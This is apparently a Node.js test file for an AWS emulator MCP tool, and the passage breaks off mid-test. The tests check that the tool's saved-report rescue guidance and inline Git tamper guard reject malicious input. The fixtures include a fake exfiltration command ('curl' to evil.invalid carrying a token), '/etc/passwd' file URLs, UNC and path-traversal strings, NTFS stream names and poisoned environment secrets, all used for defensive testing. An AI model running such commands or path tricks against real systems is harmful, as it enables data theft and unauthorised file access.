import test from 'node:test';
import assert from 'node:assert/strict';
import {spawnSync} from 'node:child_process';
import {mkdtempSync,writeFileSync,readFileSync,rmSync,symlinkSync,mkdirSync,chmodSync,existsSync} from 'node:fs';
import {tmpdir} from 'node:os';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import {inspectPreflight} from '../scripts/preflight.mjs';
import {interpretReport,parseReport,safeReportPath,readLocalReport,formatRescue} from '../scripts/report_rescue.mjs';

const BIN=fileURLToPath(new URL('../bin/aws-emulator-mcp.mjs',import.meta.url));
const SOURCE='a'.repeat(64);
const SOCKET=JSON.stringify('unix:///var/run/docker.sock')+'\n';
const ROOT_FREESPACE={bsize:1024n,bavail:14n*1024n*1024n};
function fakePreflight({platform='linux',nodeVersion='22.0.0',state='missing-image',
  rootBlocks=14n*1024n*1024n,workspaceBlocks=17n*1024n*1024n}={}){
  const calls=[];
  const run=(args)=>{
    calls.push(args);
    if(args[0]==='--version')return {status:state==='missing-cli'?1:0,stdout:'Docker version 25.0.16'};
    if(args[0]==='context')return {status:0,stdout:state==='remote-context'?JSON.stringify('tcp://198.51.100.4:2375'):SOCKET};
    if(args[0]==='info'){
      if(args.at(-1)==='{{.DockerRootDir}}')return {status:0,stdout:'/var/lib/docker'};
      return {status:state==='no-daemon'?1:0,stdout:state==='windows-containers'?'windows|25.0.16':'linux|25.0.16'};
    }
    if(args[0]==='image'){
      if(args.at(-1).includes('Config.Labels'))return state==='unverified-image'
        ? {status:1,stdout:''} : {status:0,stdout:state==='stale-image'?'b'.repeat(64):SOURCE};
      return {status:state==='missing-image'?1:0,stdout:'sha256:'+'c'.repeat(64)};
    }
    throw Error('unknown synthetic probe');
  };
  const report=inspectPreflight({platform,nodeVersion,dockerHost:state==='remote-host'?
    'ssh://HOSTNAME_SHOULD_NEVER_SHOW':'',expectedImageDigest:()=>SOURCE,run,
    statfs:location=>({bsize:1024n,bavail:location==='/var/lib/docker'?rootBlocks:workspaceBlocks})});
  return {report,calls};
}
function connect({stage='prerequisites',reason='local-docker-not-verified',passed=false}={}) {
  const complete=passed;
  const daemon=complete || stage==='stdio' || (stage==='cached-image' && reason==='source-matched-immutable-image-required');
  const attempted=complete || stage==='stdio';
  return {
    schemaVersion:1,check:'first-mcp-stdio-response',status:complete?'passed':stage==='stdio'?'failed':'blocked',
    passed:complete,stage:complete?'complete':stage,
    reason:complete?'local-mcp-stdio-read-only-tool-reply':reason,
    daemonEndpointBound:daemon,immutableImagePinned:attempted,
    dockerContainerAttempted:attempted,dockerBuildAttempted:false,
    settingsModified:false,cloudCallsMade:false,
    handshake:{initialized:complete,toolListReceived:complete,readOnlyToolReply:complete},
    toolCount:complete?29:null,
    nextCommand:'Untrusted recorded next action is deliberately ignored',
    limitations:'A terminal check cannot prove the GUI works.'
  };
}
function assertBoundedAndStatic(guidance) {
  assert.equal(guidance.schemaVersion,1);
  assert.equal(guidance.mode,'offline-saved-report-rescue');
  assert.ok(guidance.actions.length>=1 && guidance.actions.length<=3);
  assert.equal(guidance.toolCallsMade,false);
  assert.equal(guidance.settingsModified,false);
  assert.equal(guidance.emulatorApiTested,false);
  assert.equal(guidance.desktopGuiVerified,false);
  assert.ok(guidance.actions.every(a=>['terminal','MCP client prompt'].includes(a.where)));
  assert.doesNotMatch(JSON.stringify(guidance),/ssh:\/\/|SECRET_PRIVATE|api_key|DONOTPRINT|198\.51\.100/);
}

test('Windows Node failure returns copyable PowerShell steps and no installation',()=>{
  const {report,calls}=fakePreflight({platform:'win32',nodeVersion:'18.20.1'});
  const result=interpretReport(report,{invocation:'checkout'});
  assertBoundedAndStatic(result);
  assert.equal(result.platform,'win32');
  assert.equal(result.shell,'Windows PowerShell');
  assert.deepEqual(result.actions.map(a=>a.command),['Get-Command node','node --version']);
  assert.match(result.summary,/manually/);
  assert.ok(!result.actions.some(a=>/npm install|winget install|build|pull|prune/.test(a.command)));
  assert.ok(calls.every(a=>!['run','build','pull'].includes(a[0])));
});

test('remote Docker preflight never suggests contacting or selecting a remote engine',()=>{
  const {report,calls}=fakePreflight({state:'remote-host',platform:'darwin'});
  const result=interpretReport(report,{invocation:'checkout'});
  assertBoundedAndStatic(result);
  assert.equal(result.shell,'macOS Terminal');
  assert.equal(result.actions.length,2);
  assert.equal(result.actions[0].command,'docker context ls');
  assert.match(result.summary,/trusted LOCAL/);
  assert.doesNotMatch(formatRescue(result),/HOSTNAME_SHOULD_NEVER_SHOW/);
  assert.equal(calls.length,0);
});

test('critical Linux Docker disk advisory withholds build, explains 3 and 10 GiB thresholds',()=>{
  const {report}=fakePreflight({state:'stale-image',rootBlocks:250000n}); // about 0.24 GiB
  assert.equal(report.imageBuildSpace.status,'critical');
  const result=interpretReport(report);
  assertBoundedAndStatic(result);
  assert.equal(result.actions.length,2);
  assert.ok(result.actions.some(a=>a.command==='docker system df'));
  assert.ok(!result.actions.some(a=>a.command.includes(' build')));
  assert.equal(result.userApprovalRequiredForBuild,false);
  assert.match(result.warnings.join(' '),/below 3 GiB/);
  assert.match(result.warnings.join(' '),/below 10 GiB/);
  assert.match(result.warnings.join(' '),/Docker Desktop VM/);
});

test('missing image with adequate host-visible capacity gives optional signed build only after storage review',()=>{
  const {report}=fakePreflight({state:'missing-image',platform:'darwin'});
  assert.equal(report.emulatorReady,true);
  const result=interpretReport(report,{invocation:'checkout'});
  assertBoundedAndStatic(result);
  assert.equal(result.actions.length,3);
  assert.deepEqual(result.actions.map(a=>a.command),[
    'docker system df','node bin/aws-emulator-mcp.mjs build',
    'node bin/aws-emulator-mcp.mjs preflight --json']);
  assert.equal(result.userApprovalRequiredForBuild,true);
  assert.match(result.warnings.join(' '),/official signed AWS Emulator package/);
  assert.match(result.warnings.join(' '),/OPTIONAL/);
  assert.match(result.warnings.join(' '),/No image prune/);
});

test('matched image recommends separate terminal connect check without claiming live AWS or GUI',()=>{
  const {report}=fakePreflight({state:'matching-image'});
  const result=interpretReport(report,{invocation:'checkout'});
  assertBoundedAndStatic(result);
  assert.deepEqual(result.actions.map(a=>a.command),['node bin/aws-emulator-mcp.mjs connect-check --json']);
  assert.match(result.summary,/did not launch the emulator/);
  assert.match(result.warnings.join(' '),/NOT a Claude Desktop\/VS Code GUI connection/);
});

test('connect check stage remedies are distinct and never repeat untrusted nextCommand',()=>{
  for(const [stage,reason,expected] of [
    ['prerequisites','local-docker-not-verified','preflight --json'],
    ['daemon-binding','selected-local-docker-endpoint-unverified','docker context ls'],
    ['cached-image','source-matched-local-image-required',' build'],
    ['cached-image','source-matched-immutable-image-required',' build'],
    ['stdio','local-emulator-status-not-ready','connect-check --json']
  ]){
    const result=interpretReport(connect({stage,reason}),{platform:'win32',invocation:'checkout'});
    assertBoundedAndStatic(result);
    assert.ok(result.actions.some(a=>a.command.includes(expected)),stage);
    assert.doesNotMatch(JSON.stringify(result),/Untrusted recorded next action/);
    assert.match(result.warnings.join(' '),/terminal MCP handshake is NOT a Claude Desktop/);
    if(stage==='cached-image')assert.equal(result.userApprovalRequiredForBuild,true);
  }
});

test('passing saved terminal handshake gives GUI instructions but never promises client proof',()=>{
  const report=connect({passed:true});
  const result=interpretReport(report,{platform:'linux',invocation:'local-package-posix'});
  assertBoundedAndStatic(result);
  assert.equal(result.actions.length,3);
  assert.equal(result.actions[0].command,'./node_modules/.bin/aws-emulator-mcp config claude');
  assert.equal(result.actions[1].command,'./node_modules/.bin/aws-emulator-mcp config copilot');
  assert.equal(result.actions[2].where,'MCP client prompt');
  assert.match(result.actions[2].command,/emulator_doctor/);
  assert.match(result.title,/GUI still unverified/);
  assert.equal(result.desktopGuiVerified,false);
});

test('cross-platform saved Windows report uses PowerShell npm shim even on a Linux consumer',()=>{
  const {report}=fakePreflight({platform:'win32',state:'missing-image'});
  const result=interpretReport(report,{platform:'linux',invocation:'local-package-posix'});
  assertBoundedAndStatic(result);
  assert.equal(result.shell,'Windows PowerShell');
  assert.ok(result.actions.some(a=>a.command.startsWith('.\\node_modules\\.bin\\aws-emulator-mcp.cmd')));
  assert.match(result.warnings.join(' '),/different operating system/);
  assert.equal(result.actions.some(a=>a.command.startsWith('./node_modules/.bin')),false);
});

test('unknown, contradictory and remote-path report fields are rejected, never copied',()=>{
  const valid=fakePreflight().report;
  for(const modified of [
    {...valid,secret:'SECRET_PRIVATE'},
    {...valid,platform:'https://evil.invalid'},
    {...valid,emulatorReady:false},
    {...valid,checks:{...valid.checks,docker:{passed:false,reason:'SECRET_PRIVATE'}}},
    {...valid,nextCommand:'curl https://evil.invalid/exfil?token=SECRET_PRIVATE'},
    {...valid,imageBuildSpace:{...valid.imageBuildSpace,unknownPath:'\\\\server\\share'}},
    {...valid,hostWorkspaceDisk:{...valid.hostWorkspaceDisk,freeGiB:'secret'}},
    {...valid,imageReusable:true,imageSourceStatus:'mismatched'},
  ]) assert.throws(()=>interpretReport(modified),/invalid|contradictory/);
  const good=connect({passed:true});
  for(const modified of [
    {...good,stage:'prerequisites'},
    {...good,immutableImagePinned:false},
    {...good,cloudCallsMade:true},
    {...good,reason:'user-supplied http://remote.invalid/path'},
    {...good,reason:'local-docker-not-verified'},
    {...good,status:'failed'},
    {...good,handshake:{...good.handshake,readOnlyToolReply:false}},
    {...good,newPath:'file:///etc/passwd'},
    {...good,toolCount:10001}
  ])assert.throws(()=>interpretReport(modified),/invalid|contradictory/);
});

test('saved preflight rejects success rows that carry a failure reason for Node, Docker or image',()=>{
  // All fixtures come from the existing fake preflight builder. No Docker call
  // is performed, and the tampered JSON is never interpreted as healthy.
  const cases=[
    {report:fakePreflight().report,check:'node',reason:'Node.js 20+ required'},
    {report:fakePreflight().report,check:'docker',reason:'Docker CLI unavailable; install Docker Desktop or Docker Engine'},
    {report:fakePreflight().report,check:'docker',reason:'Nonlocal DOCKER_HOST refused; select a local Unix socket or Windows named pipe'},
    {report:fakePreflight({state:'stale-image'}).report,check:'image',reason:'Cached image source mismatch or unverified; the next emulator command will rebuild the signed local image'},
  ];
  for(const {report,check,reason} of cases){
    const tampered={...report,checks:{...report.checks,[check]:{passed:true,reason}}};
    assert.throws(()=>parseReport(tampered),/invalid|contradictory/,check);
    assert.throws(()=>interpretReport(tampered),/invalid|contradictory/,check);
  }
  // The image warning with an authentic passed:false must remain accepted.
  assertBoundedAndStatic(interpretReport(fakePreflight({state:'stale-image'}).report));
});

test('saved preflight rejects failed rows with empty reasons for Node, Docker or image',()=>{
  const cases=[
    {report:fakePreflight({nodeVersion:'18.20.1'}).report,check:'node'},
    {report:fakePreflight({state:'missing-cli'}).report,check:'docker'},
    {report:fakePreflight({state:'stale-image'}).report,check:'image'}
  ];
  for(const {report,check} of cases){
    const tampered={...report,checks:{...report.checks,[check]:{passed:false,reason:''}}};
    assert.throws(()=>interpretReport(tampered),/invalid|contradictory/,check);
  }
  // Authentic failures still produce actionable, bounded and safe guidance.
  for(const {report} of cases) assertBoundedAndStatic(interpretReport(report));
});

test('real preflight image-cache states agree with image row: missing, stale, unverified, matched and unchecked',()=>{
  const states=[
    ['missing-image',false,null,'not-checked',false],
    ['stale-image',true,false,'mismatched',false],
    ['unverified-image',true,false,'unverified',false],
    ['matching-image',true,true,'matched',true]
  ];
  for(const [state,cached,reusable,sourceStatus,passed] of states){
    const {report}=fakePreflight({state});
    assert.equal(report.imageCached,cached,state);
    assert.equal(report.imageReusable,reusable,state);
    assert.equal(report.imageSourceStatus,sourceStatus,state);
    assert.equal(report.checks.image.passed,passed,state);
    assertBoundedAndStatic(interpretReport(report));
  }
  // A real CLI may check a cached image without a source digest callback.
  const unchecked=fakePreflight({state:'matching-image'}).report;
  unchecked.imageReusable=null;
  unchecked.imageSourceStatus='not-checked';
  unchecked.imageBuildSpace={...unchecked.imageBuildSpace,buildExpected:null,status:'unknown'};
  assert.equal(unchecked.checks.image.passed,true);
  assertBoundedAndStatic(interpretReport(unchecked));
  // When Docker fails, preflight never creates an image row at all.
  const disconnected=fakePreflight({state:'no-daemon'}).report;
  assert.equal(Object.hasOwn(disconnected.checks,'image'),false);
  assertBoundedAndStatic(interpretReport(disconnected));
});

test('image row must equal the top-level cache and source verification, not just have an allowed reason',()=>{
  const matched=fakePreflight({state:'matching-image'}).report;
  const stale=fakePreflight({state:'stale-image'}).report;
  const missing=fakePreflight({state:'missing-image'}).report;
  const checkedNoDigest=structuredClone(matched);
  checkedNoDigest.imageReusable=null;
  checkedNoDigest.imageSourceStatus='not-checked';
  checkedNoDigest.imageBuildSpace={...checkedNoDigest.imageBuildSpace,buildExpected:null,status:'unknown'};
  const attempts=[
    // Exact PR #91 false-green: a *failed* image check and apparent matched cache.
    {...matched,checks:{...matched.checks,image:{...stale.checks.image}}},
    // A missing-tag report cannot carry an image check marked successful.
    {...missing,checks:{...missing.checks,image:{passed:true,reason:''}}},
    // A stale source label cannot carry a successful image check either.
    {...stale,checks:{...stale.checks,image:{passed:true,reason:''}}},
    // A cached-but-unchecked label cannot be described as a verified mismatch.
    {...checkedNoDigest,checks:{...checkedNoDigest.checks,image:{...stale.checks.image}}},
    // Cached:false and reusable:false is not emitted by the real preflight.
    {...missing,imageReusable:false},
    // No Docker context means no image row and no cache claim.
    {...fakePreflight({state:'no-daemon'}).report,imageReusable:false},
    // Cached:true and not-checked source cannot be marked source-matched.
    {...checkedNoDigest,imageSourceStatus:'matched'}
  ];
  for(const [i,r] of attempts.entries()){
    assert.throws(()=>parseReport(r),/invalid|contradictory/,String(i));
    assert.throws(()=>interpretReport(r),/invalid|contradictory/,String(i));
  }
});

test('NTFS alternate streams and all Windows reserved device names are rejected on every host, without opening paths',()=>{
  const hosts=['win32','linux','darwin'];
  const deviceNames=[
    'NUL.json','nul.JSON','CON.json','PRN.extra.json','AUX.json',
    'COM1.json','COM9.backup.json','LPT1.json','LPT9.report.json',
    'conin$.json','CONOUT$.json','CLOCK$.json','COM¹.json','lpt².json',
    'NUL .json','safe/COM3.json','safe/LPT9.backup.json'
  ];
  const streamNames=[
    'report.txt:secret.json','safe/report.txt:secret.json',
    'C:\\safe\\report.txt:secret.json','C:/safe/report.json:private.json',
    'C:\\safe:stream\\report.json','C::\\safe\\report.json',
    'C:relative.json'
  ];
  for(const platform of hosts){
    for(const candidate of [...deviceNames,...streamNames])
      assert.equal(safeReportPath(candidate,{platform}),false,`${platform}: ${candidate}`);
    for(const name of ['NUL.json','AUX.extra.json','COM1.json','LPT9.json']){
      const pathWithDevice=`C:\\safe folder\\${name}`;
      assert.equal(safeReportPath(pathWithDevice,{platform}),false,`${platform}: ${pathWithDevice}`);
    }
  }
  // All malicious strings above are checked ONLY by the path predicate;
  // none is passed to readLocalReport, openSync, or any filesystem call.
});

test('safe Windows drive-absolute paths and ordinary filenames with spaces remain allowed',()=>{
  for(const filename of [
    'C:\\Users\\A Developer\\saved report.json',
    'D:/Work Folder/subfolder/report.v2.JSON',
    'Z:\\Files With Spaces\\ordinary report.json',
    'safe folder/report.json','./local saved reports/report.json'
  ])assert.equal(safeReportPath(filename,{platform:'win32'}),true,filename);
  assert.equal(safeReportPath('C:\\Users\\A Developer\\saved report.json',{platform:'linux'}),false);
  for(const platform of ['linux','darwin'])
    assert.equal(safeReportPath('./safe folder/report.json',{platform}),true,platform);
});

test('R4 rescue docs require current remote ref and explicit PR #91 review; never default to old audit SHA',()=>{
  const readme=readFileSync(new URL('../README.md',import.meta.url),'utf8');
  const firstRun=readFileSync(new URL('../docs/FIRST_RUN.md',import.meta.url),'utf8');
  const guide=readFileSync(new URL('../docs/REPORT_RESCUE.md',import.meta.url),'utf8');
  const readmeRescue=readme.split('**Failed preflight or connect-check? Use the current R4 integrated preview')[1]?.split('## Help build and test it')[0];
  const firstRunRescue=firstRun.split('### Failed preflight or connect-check? Read the saved report without probing again')[1]?.split('## 3.')[0];
  assert.ok(readmeRescue && firstRunRescue,'both entrypoints must explain R4 rescue');
  const branch='release/agent-team-preview-r4-20261118';
  const ref='refs/heads/'+branch;
  const previousAudit='df27c5262da9b2f36b99c079959676710e05c422';
  for(const doc of [readmeRescue,firstRunRescue,guide]){
    assert.ok(doc.includes(branch),'missing correct R4 branch');
    assert.ok(doc.includes(ref),'must resolve dynamic R4 remote branch ref');
    assert.ok(doc.includes('v0.4.0-beta.15'),'must rule out beta15 published package');
    assert.ok(doc.includes('pull/91'),'must direct users to independently review PR #91');
    assert.ok(doc.includes('STOP'),'must explicitly fail closed');
    assert.ok(!doc.includes(previousAudit),'MUST NOT default to a vulnerable old audit SHA');
    assert.doesNotMatch(doc,/git (?:switch|checkout) --detach [0-9a-f]{40}/,
      'must not force older checkout when branch advances');
  }
  assert.match(readmeRescue,/git ls-remote https:\/\/github\.com\/B11-Health\/aws-emulator-mcp\.git/);
  assert.match(firstRunRescue,/git ls-remote https:\/\/github\.com\/B11-Health\/aws-emulator-mcp\.git/);
  assert.match(guide,/git ls-remote --exit-code/);
  assert.match(guide,/Read-Host 'Type the entire PR #91 SHA/);
  assert.match(guide,/IFS= read -r reviewed/);
  assert.match(readmeRescue,/Quote local report paths/);
  assert.match(firstRunRescue,/already saved/);
});

test('R4 shell instructions use a host-only inline guard with byte hashing and independent human review',()=>{
  const guide=readFileSync(new URL('../docs/REPORT_RESCUE.md',import.meta.url),'utf8');
  const shBlocks=[...guide.matchAll(/```sh\n([\s\S]*?)\n```/g)].map(m=>m[1]);
  const psBlocks=[...guide.matchAll(/```powershell\n([\s\S]*?)\n```/g)].map(m=>m[1]);
  assert.equal(shBlocks.length,2);
  assert.equal(psBlocks.length,2);
  for(const script of shBlocks){
    const parsed=spawnSync('sh',['-n'],{input:script,encoding:'utf8',timeout:6000});
    assert.equal(parsed.status,0,parsed.stderr);
  }
  for(const block of [shBlocks[0],psBlocks[0]]){
    assert.match(block,/git clone --config core\.autocrlf=false --depth 1 --branch/);
    assert.doesNotMatch(block,/\bnode\b/i,'clone stage must never load source');
  }
  assert.match(shBlocks[0],/test ! -e "\$repo"/);
  assert.match(psBlocks[0],/Test-Path -LiteralPath \$repo/);
  assert.match(psBlocks[0],/\$LASTEXITCODE -ne 0/);
  assert.match(shBlocks[1],/test -t 0/);
  assert.match(shBlocks[1],/IFS= read -r reviewed/);
  assert.match(psBlocks[1],/Read-Host 'Type the entire PR #91 SHA/);
  assert.match(shBlocks[1],/git ls-remote --exit-code/);
  assert.match(psBlocks[1],/git ls-remote --exit-code/);
  assert.ok(shBlocks[1].indexOf('IFS= read -r reviewed')<shBlocks[1].indexOf("node - \"$reviewed\""));
  assert.ok(psBlocks[1].indexOf('Read-Host')<psBlocks[1].indexOf('$guard | node - $reviewed'));
  const fromPosix=shBlocks[1].match(/<<'RESCUE_CHECKOUT_GUARD'\n([\s\S]*?)\nRESCUE_CHECKOUT_GUARD/);
  const fromPowerShell=psBlocks[1].match(/  \$guard = @'\n([\s\S]*?)\n'@\n  \$guard \| node - \$reviewed \$repo \$report/);
  assert.ok(fromPosix&&fromPowerShell,'inert verifier source must be inline, not loaded from checkout');
  assert.equal(fromPosix[1],fromPowerShell[1], 'Bash and PowerShell must execute identical trusted guard bytes');
  const code=fromPosix[1];
  for(const fragment of [
    "env.GIT_NO_REPLACE_OBJECTS='1'",'GIT_',
    "['for-each-ref','--format=%(refname)','refs/replace']",
    "['ls-files','-v','-z']", "flag.startsWith('H ')",
    "['ls-files','--stage','-z']", "['ls-tree','-rz','HEAD']",
    "['ls-remote','--exit-code',origin,ref]",
    "['symbolic-ref','--quiet','--short','HEAD']",
    "crypto.createHash('sha1')", 'bytes.length',
    'digest!==match[2]','isSymbolicLink()','walk(root',
    "process.argv[2]", "process.argv[3]", "process.argv[4]",
    "'rescue',report",'spawnSync(process.execPath'
  ])assert.ok(code.includes(fragment),'missing trust check '+fragment);
  assert.ok(code.indexOf("['ls-tree','-rz','HEAD']")<code.indexOf('spawnSync(process.execPath'));
  assert.doesNotMatch(code,/\b(docker|aws-sdk|codex)\b/i);
  const syntax=spawnSync(process.execPath,['--check'],{input:code,encoding:'utf8',timeout:6000});
  assert.equal(syntax.status,0,syntax.stderr);
  assert.match(guide,/not third-party source attestation/);
  assert.match(guide,/only allowed untracked files/);
});

// These tests run only the self-contained inline verifier and an inert Git
// fixture. The 'git ls-remote' command is intercepted by a local fake executable
// and no Docker, AWS, GitHub network, or repository application code is loaded.
function rescueInlineGuard(){
  const guide=readFileSync(new URL('../docs/REPORT_RESCUE.md',import.meta.url),'utf8');
  const script=guide.match(/<<'RESCUE_CHECKOUT_GUARD'\n([\s\S]*?)\nRESCUE_CHECKOUT_GUARD/);
  assert.ok(script);
  return script[1];
}
function safeGit(cwd,args,extraEnv={}){
  const res=spawnSync('git',args,{cwd,encoding:'utf8',timeout:8000,
    env:{...process.env,GIT_CONFIG_NOSYSTEM:'1',GIT_CONFIG_GLOBAL:'/dev/null',...extraEnv}});
  assert.equal(res.status,0,res.stderr+'; '+args.join(' '));
  return res.stdout.trim();
}
function makeRescueGitFixture(){
  const root=mkdtempSync(path.join(tmpdir(),'r4 rescue guard with spaces '));
  const repo=path.join(root,'aws-emulator-mcp-r4');
  const marker=path.join(root,'INERT_SOURCE_RAN');
  const fakeBin=path.join(root,'stub-bin');
  mkdirSync(repo);mkdirSync(fakeBin);
  safeGit(root,['init','--initial-branch=release/agent-team-preview-r4-20261118',repo]);
  safeGit(root,['-C',repo,'config','user.email','fixture@example.invalid']);
  safeGit(root,['-C',repo,'config','user.name','Isolated Fixture']);
  safeGit(root,['-C',repo,'remote','add','origin','https://github.com/B11-Health/aws-emulator-mcp.git']);
  mkdirSync(path.join(repo,'bin'));
  const dummy="import {writeFileSync} from 'node:fs';import {resolve} from 'node:path';writeFileSync(resolve('..','INERT_SOURCE_RAN'),'inert');\n";
  writeFileSync(path.join(repo,'bin','aws-emulator-mcp.mjs'),dummy);
  writeFileSync(path.join(repo,'scripts.txt'),'Versioned fixture content\n');
  safeGit(root,['-C',repo,'add','.']);
  safeGit(root,['-C',repo,'commit','-m','inert fixture']);
  const script=path.join(fakeBin,'git');
  writeFileSync(script,`#!/bin/sh
for argument in "$@"; do
  if [ "$argument" = "ls-remote" ]; then
    if [ "$TEST_REMOTE_SHA" = "same" ]; then
      SHA="$($TEST_REAL_GIT -C "$TEST_REPO" rev-parse HEAD)"
    else
      SHA="$TEST_REMOTE_SHA"
    fi
    printf '%s\\t%s\\n' "$SHA" 'refs/heads/release/agent-team-preview-r4-20261118'
    exit 0
  fi
done
exec "$TEST_REAL_GIT" "$@"
`);
  chmodSync(script,0o755);
  const realGit=safeGit(root,['--exec-path']); // Git subprocess above confirms Git available.
  // Resolve executable instead of guessing /usr/bin/git; PATH is untouched
  // outside this disposable fixture environment.
  const gitPath=spawnSync('which',['git'],{encoding:'utf8',timeout:5000});
  assert.equal(gitPath.status,0);
  const env={...process.env,PATH:fakeBin+':'+process.env.PATH,
    TEST_REAL_GIT:gitPath.stdout.trim(),TEST_REPO:repo,TEST_REMOTE_SHA:'same'};
  const head=safeGit(root,['-C',repo,'rev-parse','HEAD']);
  writeFileSync(path.join(repo,'preflight-report.json'),'{}');
  function attempt(overrides={}){
    return spawnSync(process.execPath,['-',overrides.reviewed||head,repo,'./preflight-report.json'],{
      cwd:root,encoding:'utf8',input:rescueInlineGuard(),timeout:9000,
      env:{...env,...overrides.env}
    });
  }
  return {root,repo,marker,head,env,attempt,cleanup:()=>rmSync(root,{force:true,recursive:true})};
}

test('inert fixture verifies a clean reviewed tree and launches only a harmless marker',{
  skip:process.platform==='win32'?'POSIX Git shim only':false
},()=>{
  const f=makeRescueGitFixture();
  try{
    const out=f.attempt();
    assert.equal(out.status,0,out.stderr);
    assert.equal(readFileSync(f.marker,'utf8'),'inert');
  }finally{f.cleanup();}
});

test('hidden assume-unchanged and skip-worktree flags never launch altered fixture code',{
  skip:process.platform==='win32'?'POSIX Git shim only':false
},()=>{
  for(const flag of ['--assume-unchanged','--skip-worktree']){
    const f=makeRescueGitFixture();
    try{
      writeFileSync(path.join(f.repo,'bin/aws-emulator-mcp.mjs'),"// changed tracked executable source\n");
      safeGit(f.root,['-C',f.repo,'update-index',flag,'bin/aws-emulator-mcp.mjs']);
      assert.equal(safeGit(f.root,['-C',f.repo,'status','--porcelain','--untracked-files=no']),'',
        'demonstrate Git status missed the hidden change');
      const flags=safeGit(f.root,['-C',f.repo,'ls-files','-v']);
      assert.match(flags,flag==='--assume-unchanged'?/^h /m:/^S /m);
      const out=f.attempt();
      assert.equal(out.status,2,out.stderr);
      assert.match(out.stderr,/index flag/);
      assert.equal(existsSync(f.marker),false);
    }finally{f.cleanup();}
  }
});

test('inert guard blocks altered tracked bytes, staged index changes and stale R4 remote head',{
  skip:process.platform==='win32'?'POSIX Git shim only':false
},()=>{
  const scenarios=[
    f=>writeFileSync(path.join(f.repo,'scripts.txt'),'tampered file bytes\n'),
    f=>{writeFileSync(path.join(f.repo,'scripts.txt'),'staged tampering\n');safeGit(f.root,['-C',f.repo,'add','scripts.txt']);},
    f=>{f.env.TEST_REMOTE_SHA='b'.repeat(40);}
  ];
  for(const change of scenarios){
    const f=makeRescueGitFixture();
    try{
      change(f);
      const out=f.attempt();
      assert.equal(out.status,2,out.stderr);
      assert.equal(existsSync(f.marker),false);
    }finally{f.cleanup();}
  }
});

test('inert guard rejects Git replacement objects, symlink entries, submodules and unexpected extra files',{
  skip:process.platform==='win32'?'POSIX Git shim only':false
},()=>{
  const cases=[
    f=>{
      const before=f.head;
      writeFileSync(path.join(f.repo,'scripts.txt'),'Second commit\n');
      safeGit(f.root,['-C',f.repo,'add','scripts.txt']);
      safeGit(f.root,['-C',f.repo,'commit','-m','second commit']);
      const now=safeGit(f.root,['-C',f.repo,'rev-parse','HEAD']);
      safeGit(f.root,['-C',f.repo,'replace',now,before]);
    },
    f=>{
      symlinkSync('scripts.txt',path.join(f.repo,'tracked-link'));
      safeGit(f.root,['-C',f.repo,'add','tracked-link']);
      safeGit(f.root,['-C',f.repo,'commit','-m','symlink entry']);
    },
    f=>{
      safeGit(f.root,['-C',f.repo,'update-index','--add','--cacheinfo','160000,'+f.head+',fake-submodule']);
      safeGit(f.root,['-C',f.repo,'commit','-m','gitlink entry']);
    },
    f=>writeFileSync(path.join(f.repo,'untracked-evil.js'),'// unexpected extra file\n')
  ];
  for(const modify of cases){
    const f=makeRescueGitFixture();
    try{
      modify(f);
      const out=f.attempt({reviewed:safeGit(f.root,['-C',f.repo,'rev-parse','HEAD'])});
      assert.equal(out.status,2,out.stderr);
      assert.equal(existsSync(f.marker),false);
    }finally{f.cleanup();}
  }
});

test('non-reviewed SHA, unexpected Git origin and missing remote cannot execute inert code',{
  skip:process.platform==='win32'?'POSIX Git shim only':false
},()=>{
  for(const change of [
    f=>({reviewed:'c'.repeat(40)}),
    f=>{safeGit(f.root,['-C',f.repo,'remote','set-url','origin','https://bad.example.invalid/repo.git']);return{};},
    f=>({env:{TEST_REMOTE_SHA:'d'.repeat(40)}})
  ]){
    const f=makeRescueGitFixture();
    try{
      const out=f.attempt(change(f));
      assert.equal(out.status,2,out.stderr);
      assert.equal(existsSync(f.marker),false);
    }finally{f.cleanup();}
  }
});

test('report selector accepts local paths with spaces and Windows drive paths; rejects URLs, UNC, devices and traversal',()=>{
  for(const good of ['./saved reports/my preflight.json','/tmp/saved report.json'])
    assert.equal(safeReportPath(good,{platform:'linux'}),true,good);
  assert.equal(safeReportPath('C:\\Users\\A Developer\\preflight.json',{platform:'win32'}),true);
  for(const bad of [
    'https://example.invalid/report.json','file:///tmp/report.json',
    '//server/share/report.json','\\\\server\\share\\report.json',
    '\\\\?\\C:\\Windows\\report.json','\\\\.\\pipe\\report.json',
    '../secret.json','./reports/../secret.json','ssh://host/path.json',
    'C:relative.json','--json','report.txt','report.json\nSECRET_PRIVATE'
  ]) {
    assert.equal(safeReportPath(bad,{platform:'win32'}),false,bad);
    assert.equal(safeReportPath(bad,{platform:'linux'}),false,bad);
  }
});

test('bounded regular local file is read without echoing its path; symlinks and oversized files are refused',()=>{
  const dir=mkdtempSync(path.join(tmpdir(),'rescue-test with spaces-'));
  try {
    const filename=path.join(dir,'saved report.json');
    const alias=path.join(dir,'alias.json');
    const data=fakePreflight({state:'remote-host'}).report;
    writeFileSync(filename,JSON.stringify(data));
    assert.deepEqual(readLocalReport(filename),data);
    symlinkSync(filename,alias);
    assert.throws(()=>readLocalReport(alias),/invalid|unsafe/);
    writeFileSync(path.join(dir,'huge.json'),' '.repeat(65537));
    assert.throws(()=>readLocalReport(path.join(dir,'huge.json')),/invalid/);
  } finally {rmSync(dir,{recursive:true,force:true});}
});

test('CLI reads a saved file and never probes Docker or echoes secrets even with poisoned environment',()=>{
  const dir=mkdtempSync(path.join(tmpdir(),'saved rescue report with spaces-'));
  try {
    const filename=path.join(dir,'failed preflight.json');
    writeFileSync(filename,JSON.stringify(fakePreflight({state:'remote-host'}).report));
    const response=spawnSync(process.execPath,[BIN,'rescue',filename,'--json'],{
      encoding:'utf8',timeout:9000,env:{PATH:'/nonexistent',DOCKER_HOST:'ssh://SECRET_REMOTE_DOCKER',
        AWS_SECRET_ACCESS_KEY:'SECRET_PRIVATE_AWS_CRED'}
    });
    assert.equal(response.status,0,response.stderr);
    assert.equal(response.stderr,'');
    const result=JSON.parse(response.stdout);
    assertBoundedAndStatic(result);
    assert.equal(result.source,'preflight');
    assert.doesNotMatch(response.stdout,/SECRET|ssh:\/\/|saved rescue report with spaces/);
    const invalid=spawnSync(process.execPath,[BIN,'rescue','\\\\server\\share\\not-local.json'],{
      encoding:'utf8',timeout:9000,env:{PATH:'/nonexistent',DOCKER_HOST:'ssh://SECRET_REMOTE_DOCKER'}
    });
    assert.equal(invalid.status,2);
    assert.equal(invalid.stdout,'');
    assert.doesNotMatch(invalid.stderr,/server|share|SECRET_REMOTE_DOCKER/);
